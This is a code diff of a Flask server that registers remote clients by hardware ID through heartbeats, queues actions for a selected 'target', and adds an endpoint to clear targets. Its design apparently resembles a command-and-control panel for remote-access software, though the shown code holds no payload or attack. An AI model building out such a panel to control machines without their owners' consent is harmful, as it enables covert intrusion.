@@ -3,7 +3,6 @@ from flask import Flask, request, jsonify, render_template
 
 app = Flask(__name__)
 
-# Dictionary para sa active clients (HWID ang key para iwas duplicate)
 clients = {}
 
 @app.route('/')
@@ -16,7 +15,6 @@ def heartbeat():
     hwid = data.get('hwid')
     ip = data.get('ip')
     if hwid:
-        # I-update o i-overwrite ang nag-iisang card para sa HWID na ito
         clients[hwid] = {
             "hwid": hwid,
             "ip": ip,
@@ -28,11 +26,9 @@ def heartbeat():
 @app.route('/api/clients')
 def get_clients():
     now = time.time()
-    # Kusang tanggalin sa listahan ang mga hindi nag-heartbeat ng mahigit 30 segundo
-    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 30]
+    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 35]
     for hwid in offline_nodes:
         del clients[hwid]
-        
     return jsonify(clients)
 
 @app.route('/api/target-action', methods=['POST'])
@@ -42,6 +38,14 @@ def target_action():
     action = data.get('action', '')
     if hwid in clients:
         clients[hwid]["pending_action"] = action
+    return "", 200
+
+@app.route('/api/clear-target', methods=['POST'])
+def clear_target():
+    data = request.json
+    hwid = data.get('hwid')
+    if hwid in clients:
+        del clients[hwid]
     return "", 200
 
 if __name__ == '__main__':
